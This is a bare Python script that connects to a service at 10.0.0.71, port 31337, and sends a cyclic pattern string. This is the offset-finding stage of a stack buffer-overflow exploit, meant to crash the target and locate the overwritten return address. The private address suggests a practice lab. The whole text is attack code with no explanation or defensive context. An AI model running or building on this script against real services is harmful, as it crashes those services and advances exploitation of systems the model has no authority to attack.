#!/usr/bin/python
from __future__ import print_function
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('10.0.0.71',31337))
       s.send((offset + '\n'))
       s.close()

except:
       print("Error connecting to server")
       sys.exit()
